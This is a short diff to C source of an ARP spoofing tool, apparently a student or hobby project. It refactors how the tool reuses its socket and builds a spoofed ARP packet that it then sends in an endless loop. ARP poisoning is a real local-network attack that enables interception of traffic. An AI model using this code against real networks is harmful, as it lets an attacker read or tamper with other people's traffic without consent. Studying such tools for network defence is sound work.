@@ -28,7 +28,6 @@ static void print_mac_address(uint8_t mac[ETH_ALEN])
 
 static void send_packet(arp_packet_t *packet, arp_t *arp)
 {
-    int sock = create_socket();
     struct sockaddr_ll dest_addr = create_dest_address(arp->iface);
     socklen_t addr_size = sizeof(struct sockaddr_ll);
 
@@ -37,7 +36,7 @@ static void send_packet(arp_packet_t *packet, arp_t *arp)
     print_mac_address(packet->eth_hdr.ether_dhost);
     printf("'\n");
     while (true) {
-        if (sendto(sock, &packet, sizeof(arp_packet_t), 0,
+        if (sendto(arp->sock, &packet, sizeof(arp_packet_t), 0,
                 (struct sockaddr *) &dest_addr, addr_size) == -1) {
             perror("sendto");
         }
@@ -51,9 +50,8 @@ int arp_spoof(arp_t *arp)
     arp_packet_t packet;
     uint8_t *mac = get_mac_of(arp);
 
-    init_broadcast(&packet, arp);
-    memcpy(packet.eth_hdr.ether_dhost, mac, ETH_ALEN);
-    memcpy(packet.eth_arp.arp_tha, mac, ETH_ALEN);
+    arp->mac_address = char6_to_mac((unsigned char *)mac);
+    init_spoofed(&packet, arp);
     free(mac);
     send_packet(&packet, arp);
     return 0;
